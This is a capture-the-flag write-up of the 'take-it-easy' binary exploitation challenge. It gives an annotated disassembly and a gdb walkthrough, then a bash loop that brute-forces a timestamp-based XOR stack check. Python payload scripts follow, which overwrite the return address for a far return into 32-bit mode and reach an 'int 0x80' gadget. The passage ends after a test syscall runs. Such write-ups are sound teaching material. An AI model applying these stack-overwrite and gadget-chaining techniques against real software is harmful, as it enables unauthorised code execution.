We gonna take a crack at a meduim binary exploitation challenge by Touhami Kasbaoui.

This is the link for the binary:

http://tracker.0btemoslab.com/challenges/take-it-easy

![file](https://pouch.jumpshare.com/preview/zlejgyvYLyHjzNh9Ymf8nOJE5Y9XUyV811MVVYOBjty4jWyd9mBPAR97IEnHrzB9xQysGijYlM7l3EWEjMzh9TJprjKJn4snkOQIlHyX-Do)

As you can see, it's a stripped x86_64 ELF binary. Let's check the ELF header.

![readelf -h header](https://pouch.jumpshare.com/preview/BvNXIFjQp8f6YqGbVYaneC7wiItwdnqsmDoPnC9lQo2LDFrfY55bpSL4txKwahbLJmHTIUyC7XoQy9o-VssUUTJprjKJn4snkOQIlHyX-Do)

What we can learn from this, is that the entry point to this binary is at **0x400144**.

Let's execute the binary.

![./take-it-easy](https://pouch.jumpshare.com/preview/7MlrxrrC7lC1fLIyllR8XvdoDB-u6fFgxxlA0ec3_ifr268PTCZ_oX1v4Q1NpCUdH_5BUel3Fq_kXqVIVHC5bxA1jQB_zmxltR5bgJ1-nls)

As you can see that the binary output "input" and read characters from the stdin, After that output "checkser" and read again. Let's use gdb to examine what's happening.

*NOTE: Remember that it is a stripped binary so no symbols are available, we need to break at the entry point address 0x400144*

![gdb take-it-easy](https://pouch.jumpshare.com/preview/bnDtseOR67PEK6j0LtLkudqvKTKEiLcTtURiqQ4-t0DN7SNmTUG5C9KRUe0AaiezR6DQnalSTy3EhLe3szKU4BA1jQB_zmxltR5bgJ1-nls)

You can use the gdb to go step by step with instructions and use ***i r*** to list the registers and examine there values.

[GDB-PEDA](https://github.com/longld/peda) is a great extension that will help you visualize the register and the stack more easily.

This is the instructions the binary contain:

```

   0x400144:	mov    rax,0x1
   0x40014b:	mov    rdi,0x1
   0x400152:	movabs rsi,0x6000000                ("input\n")
   0x40015c:	mov    rdx,0x6
   0x400163:	syscall                             write syscall  
   0x400165:	xor    rax,rax
   0x400168:	xor    rdi,rdi
   0x40016b:	movabs rbx,0x6000400
   0x400175:	mov    rsi,rbx
   0x400178:	mov    rdx,0x8                     reads 8Bytes
   0x40017f:	syscall                            read syscall
   0x400181:	rdtsc                              Read Time-Stamp Counter
   0x400183:	xor    rax,rdx                     XOR rax and rdx that contain the Time-Stamp
   0x400186:	mov    rdi,rbx
   0x400189:	mov    rcx,0x0
   0x400190:	mov    rdi,rbx                     --------------------------------------------
   0x400193:	add    rdi,rcx                       A loop that iterate on the buffer read 
   0x400196:	xor    BYTE PTR [rdi],al               before and perfome an xop operation
   0x400198:	inc    rcx                              on each byte and the al register
   0x40019b:	cmp    rcx,0x8
   0x40019f:	jl     0x400190                    --------------------------------------------
   0x4001a1:	mov    rax,QWORD PTR [rbx]
   0x4001a4:	push   rax                         Push the modified buffer to the stack
   0x4001a5:	sub    rsp,0x20                    Subtract the rsp pointer
   0x4001a9:	mov    rax,0x1
   0x4001b0:	mov    rdi,0x1
   0x4001b7:	movabs rsi,0x6000007               (checkser\n)
   0x4001c1:	mov    rdx,0xa
   0x4001c8:	syscall                            write syscall
   0x4001ca:	xor    rax,rax
   0x4001cd:	xor    rdi,rdi
   0x4001d0:	mov    rsi,rsp                     store the buffer read directly on the stack
   0x4001d3:	mov    rdx,0x100                   reads 256Bytes
   0x4001da:	syscall                            read syscall
   0x4001dc:	add    rsp,0x20                    restore the stack to it's original address wish mean 32Byte of out input is ignored
   0x4001e0:	mov    rdi,0x1
   0x4001e7:	mov    rsi,0x3
   0x4001ee:	mov    rdx,0x3
   0x4001f5:	mov    rcx,0x7
   0x4001fc:	cmp    rax,0x20                    If the buffer size read is less than or equal to 32Byte then the program exit
   0x400200:	jle    0x400214
   0x400202:	pop    r11                         pop the buffer from the stack
   0x400204:	xor    r11,QWORD PTR [rbx]         check if the buffer was tampred with
   0x400207:	jne    0x400214
   0x400209:	mov    QWORD PTR [rsp+0x8],0x23    set 0x23 at the rsp+0x8 wish will set the code segment at the return far
   0x400212:	retfq                              return far wish pop the instruction address and code segment from the top of the stack
   0x400214:	mov    rax,0x3c
   0x40021b:	mov    rbx,0x0
   0x400222:	syscall                            exit syscall

```

The main part that jumped out to me is the loop that modify the buffer we input using the Read Time-Stamp Counter.

[RDTSC](https://c9x.me/x86/html/file_module_x86_id_278.html)

Loads the current value of the processor's time-stamp counter into the EDX:EAX registers. The time-stamp counter is contained in a 64-bit MSR. The high-order 32 bits of the MSR are loaded into the EDX register, and the low-order 32 bits are loaded into the EAX register.

[x86_64 registers](https://wiki.osdev.org/CPU_Registers_x86-64)

![x86_64 registers](https://askcodez.com/images2/155807970253616.png)

[XOR](https://www.loginradius.com/blog/engineering/how-does-bitwise-xor-work/#:~:text=XOR%20is%20a%20bitwise%20operator,X)

![XOR](https://i.stack.imgur.com/qncwi.png)

Let's run the debugger and see if we can understand what's going on.

*I am going to provide an input of "AAAAAAAA".*

![gdb take-it-easy](https://pouch.jumpshare.com/preview/xZkkhLGGgCjy_l4-s9YEWNqvAuxNqR8NWdIN0Mgk9h6r-wn3395rj10n486AkehIYwo3AGyPdvSQKNUULLGFqzJprjKJn4snkOQIlHyX-Do)

As you can see our input got modified using the xor operation with the $al register wish is read from the time stamp counter. We have no control over the time stamp counter, but knowing the nature of CPU's the time stamp counter is geting incremented each second with an insane speed. 

The second read syscall allow us to store directly into the stack. Knowing that all we have to do is write the next instruction address to the stack and return far will pop it giving us control. But to write our address to the stack we need to overwrite the value pushed before, thus the program quit as it checks if the stack got tampred with.

```
   0x400204:	xor    r11,QWORD PTR [rbx]
   0x400207:	jne    0x400214
```

As said before the time stamp counter will be modified every time we execute the binary. We can brute force the time stamp counter by executing the binary in an infinite loop until one time the sanitization output will be the same as a value we set into the stack thus the check will pass allowing us to write out own address to the stack.

```
#!/bin/bash
while [ 1 ]
do
  echo "---------- starting ------------"
  ./take-it-easy < inputs > /dev/null # execute the binary and redirect stdout to /dev/null so the stdout won't be fludded
  if [ $? -eq 139 ] # check if the binary triggred a SEGV signal
  then
    break
  fi
  echo "---------- end ----------------"
done
```

*I am going to provide an input of "AAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV".*

![./exploit.sh](https://pouch.jumpshare.com/preview/7ve7SjqX_uPWYeujlAKeB3wbwPIqfKjQ2C9887EQyctySB8GCtLDMKzYH8nSNiNvOv0AQfWUmJzbl37Sgn2OTxA1jQB_zmxltR5bgJ1-nls)

The first buffer check is bypassed. Know let's inject an address to the stack and see if we can get control of the instruction pointer after the return far call.

*I am going to write to the stack the address of the write checkser address 0x4001a9. We are expecting to see checkser output two times*

```
fo = open("payload", "wb")

payload = b'A'*8 # the first input

payload += b'X'*40 # 0x20 the the stack get added with + 8 Bytes of the poped buffer

payload += b"\xa9\x01\x40\x00\x00\x00\x00\x00" # the address is inverted because of little endianness

fo.write(payload)

fo.close()
```

![./exploit.sh](https://pouch.jumpshare.com/preview/8c0RpMeHe5QjTQDLpHu9PncHxWIbsc4C4D9IzfH62G73FBk-rICMjSIjL4wKrWguiq5rWBkcjZp8NeZyfgmcfDJprjKJn4snkOQIlHyX-Do)

**No double checkser!? what's going on?**

We overlook something. return far does more than pop the instruction address from the stack, it also pop another byte to set the code segment register setting it with a value of 0x23. After the return far the code now is running on 32 bit mode. We can test that by loocking for 32 bit instruction and try to execute them.

```
   0x400214:	mov    rax,0x3c
```

After using a tool called ropper that look for gadgets in the binary, i found a gadget that call a system call. *int 0x80*

![ropper](https://pouch.jumpshare.com/preview/dYhIS75pQl2ijWxcym8Ky8KWzAQ77Skl22UrL8ArM7s00HL9VVjcNFuBG2wjmOK9wQbIzcOpD1Z6nKpdFClmKjJprjKJn4snkOQIlHyX-Do)

![gdb](https://pouch.jumpshare.com/preview/e6y-U3rpzjmLBjYdP8_ZcgQ1UpF6nJdfbWn2RX_qg8JUmNZBZ1x1-Hmulw2YiG1F8xPQiU4VEiHwy8nwRvV6zTJprjKJn4snkOQIlHyX-Do)

We can also controll the eax register because it was never reset after the last read syscall. Wish mean that the eax register will be set by the lenght of out last input. But it will be limited because we can't input a buffer less than 33 Byte plus the address of the gadget and the max is 256 Bytes.

```
   0x4001ca:	xor    rax,rax
   0x4001cd:	xor    rdi,rdi
   0x4001d0:	mov    rsi,rsp
   0x4001d3:	mov    rdx,0x100
   0x4001da:	syscall
```

[x86 syscall table](https://x86.syscall.sh/)

I am going to use olduname to test and run the binary using the debugger to examine the registers.
***For debugging i bypass the buffer check by setting rbx to the value of r11, set *((unsigned long *) 0x6000400)=$r11***

```
fo = open("payload", "wb")

payload = b'A'*8

payload += b'X'*40

payload += b"\x37\x01\x40\x00\x00\x00\x00\x00"

payload += b'A'*61

fo.write(payload)

fo.close()
```

![gdb](https://pouch.jumpshare.com/preview/AsHoOU5CT2iZHkvVBfqYQNFqH6CvdobkJByIPqsCOUnDXw942AAj4hVveVsUk2l-alTpIrR-BYGnczTHh_-m5BA1jQB_zmxltR5bgJ1-nls)

We can see that olduname got executed succesfully, and also we can see that the esp point to an invalid address because of the switch to 32bit mode.


